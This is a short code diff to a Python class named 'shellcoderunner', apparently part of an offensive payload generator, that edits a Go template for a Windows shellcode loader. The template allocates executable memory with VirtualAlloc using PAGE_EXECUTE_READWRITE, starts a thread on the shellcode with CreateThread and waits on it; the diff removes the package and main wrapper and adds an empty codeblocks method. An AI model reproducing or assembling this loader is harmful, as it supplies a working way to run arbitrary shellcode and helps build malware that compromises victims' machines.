@@ -11,19 +11,11 @@ class shellcoderunner:
     def compilerOptions(self) -> list[str]:
         return ["golang.org/x/sys/windows"]
 
+    def codeblocks(self) -> str:
+        return """"""
+
     def template(self) -> str:
         return """
-package main
-    
-import (
-{imports}
-)
-
-{codeblocks}
-
-func main() {{
-
-    
     {transformers}
 
 	addr, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
@@ -37,5 +29,4 @@ func main() {{
 	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
 
 	windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
-}}
 """
